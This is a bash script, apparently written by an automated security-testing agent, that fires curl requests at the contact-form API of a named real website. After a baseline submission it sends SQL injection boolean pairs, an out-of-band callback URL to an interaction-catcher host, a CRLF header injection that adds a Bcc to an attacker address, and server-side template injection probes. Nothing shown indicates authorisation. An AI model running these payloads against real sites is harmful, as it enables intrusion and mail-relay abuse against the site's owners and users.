#!/bin/bash
cd $WORK_PATH/tool_outputs
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
O="oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

echo "### 1. VALID submission (real field names)"
curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" -H "Referer: https://www.infinitycapital.bh/contact" \
  -F "fname=IC" -F "lname=Tester" -F "areacode=973" -F "tel=00000000" \
  -F "cname=Example" -F "subject=General Inquiry" -F "msg=icmap-baseline-001" \
  -F "check=1" -F "targets=1" \
  -D s1.hdr -o s1.txt -w "code=%{http_code} size=%{size_download}\n"
head -1 s1.hdr; cat s1.txt; echo

echo "### 2. SQLi in msg (boolean pair)"
curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" \
  -F "fname=IC" -F "lname=Tester" -F "areacode=973" -F "tel=00000000" -F "cname=Example" \
  -F "subject=General" -F "msg=x' AND 1=1-- " -F "check=1" -F "targets=1" \
  -o s2.txt -w "sqlTrue code=%{http_code} body=" ; cat s2.txt; echo
curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" \
  -F "fname=IC" -F "lname=Tester" -F "areacode=973" -F "tel=00000000" -F "cname=Example" \
  -F "subject=General" -F "msg=x' AND 1=2-- " -F "check=1" -F "targets=1" \
  -o s3.txt -w "sqlFalse code=%{http_code} body=" ; cat s3.txt; echo

echo "### 3. SSRF-ish / OOB in msg (email header injection candidate)"
curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" \
  -F "fname=IC" -F "lname=Tester" -F "areacode=973" -F "tel=00000000" -F "cname=Example" \
  -F "subject=General" -F "msg=http://${O}/sendmsg" -F "check=1" -F "targets=1" \
  -o s4.txt -w "oobMsg code=%{http_code} body=" ; cat s4.txt; echo

echo "### 4. CRLF header injection via fname"
curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" \
  -F $'fname=IC\r\nBcc: attacker@example.invalid' -F "lname=Tester" -F "areacode=973" -F "tel=00000000" \
  -F "cname=Example" -F "subject=General" -F "msg=crlf" -F "check=1" -F "targets=1" \
  -o s5.txt -w "crlf code=%{http_code} body=" ; cat s5.txt; echo

echo "### 5. template injection in msg"
curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" \
  -F "fname=IC" -F "lname=Tester" -F "areacode=973" -F "tel=00000000" -F "cname=Example" \
  -F "subject=General" -F 'msg={{7*7}} ${7*7} <%= 7*7 %> #{7*7}' -F "check=1" -F "targets=1" \
  -o s6.txt -w "ssti code=%{http_code} body=" ; cat s6.txt; echo
